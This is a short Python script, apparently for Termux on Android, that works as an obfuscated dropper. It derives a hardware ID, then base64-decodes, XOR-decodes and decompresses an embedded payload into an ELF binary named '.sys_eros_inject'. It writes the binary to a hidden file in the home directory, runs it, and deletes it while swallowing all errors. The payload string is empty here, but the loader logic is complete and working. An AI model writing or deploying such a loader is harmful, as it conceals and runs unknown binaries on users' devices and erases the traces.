# -*- coding: utf-8 -*-
import os, sys, zlib, base64, hashlib, subprocess
from pathlib import Path

def obter_hwid_termux():
    try:
        resultado = subprocess.check_output(['settings', 'get', 'secure', 'android_id'], stderr=subprocess.DEVNULL)
        hwid = resultado.decode().strip()
        if hwid and hwid != "null":
            return hashlib.md5(hwid.encode()).hexdigest().upper()
    except Exception: pass
    termux_user = os.environ.get('USER', 'u0_a000')
    home_dir = os.environ.get('HOME', '/data/data/com.termux/files/home')
    hash_fallback = hashlib.md5(home_dir.encode()).hexdigest()[:12].upper()
    return f"TMX_{termux_user}_{hash_fallback}"

if not obter_hwid_termux(): 
    sys.exit()

_PAYLOAD = ""
_CHAVE = 170
_NOME = "eros_inject"

try:
    dados_xor = base64.b64decode(_PAYLOAD)
    dados_comprimidos = bytes(b ^ _CHAVE for b in dados_xor)
    binario_elf = zlib.decompress(dados_comprimidos)
    
    pasta_interna = Path("/data/data/com.termux/files/home")
    caminho_tmp = pasta_interna / f".sys_{_NOME}"
    
    caminho_tmp.write_bytes(binario_elf)
    caminho_tmp.chmod(0o755)
    
    subprocess.run([str(caminho_tmp)], check=True)
    
except Exception:
    pass
finally:
    if 'caminho_tmp' in locals() and caminho_tmp.exists():
        caminho_tmp.unlink()
